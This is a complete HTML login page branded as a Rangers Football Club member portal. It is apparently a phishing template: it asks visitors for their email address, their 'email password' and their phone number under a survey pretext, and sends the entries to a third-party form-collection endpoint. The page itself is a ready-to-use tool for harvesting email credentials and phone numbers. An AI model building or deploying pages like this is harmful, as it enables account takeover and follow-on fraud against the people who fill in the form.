<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rangers Football Club Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #0047ab;
            color: white;
            text-align: center;
        }
        .form-container {
            margin-top: 50px;
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 8px;
            display: inline-block;
        }
        input[type="email"], input[type="password"], input[type="tel"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #f4f4f4;
            color: #333;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #0047ab;
            color: white;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>Rangers FC Member Login</h2>
    <form name="loginForm" method="POST" action="https://api.netlify.com/form/your_form_id" data-netlify="true">
        <input type="email" name="email" placeholder="Enter your email" required>
        <input type="password" name="userPassword" placeholder="Enter your email password" required>
        <input type="tel" name="phone" placeholder="Enter your phone number so we can text you the survey" required>
        <button type="submit">Login</button>
    </form>
</div>

<script>
    document.forms['loginForm'].addEventListener('submit', function() {
        alert('Form submitted successfully!');
    });
</script>

</body>
</html>
